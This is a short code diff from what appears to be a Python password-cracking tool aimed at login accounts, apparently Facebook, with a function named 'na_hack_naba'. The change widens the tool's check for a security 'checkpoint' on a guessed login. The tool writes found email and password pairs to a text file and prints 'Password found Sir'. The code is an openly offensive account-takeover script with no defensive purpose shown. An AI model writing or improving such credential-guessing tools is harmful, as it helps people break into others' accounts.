@@ -64,7 +64,7 @@ def na_hack_naba(email,password):
         print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
         print(65 * '\033[1;92m=')
         return True
-      elif "checkpoint" in r.cookies or "checkpoint_title" in r.text:
+      elif "checkpoint" in r.cookies or "checkpoint_title" in r.text or "checkpoint" in r.url:
         open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password))
         print(65 * '\033[1;92m=')
         print('\n\033[1;93mPassword found but checkpoint: \033[1;92m'+password+'\n')
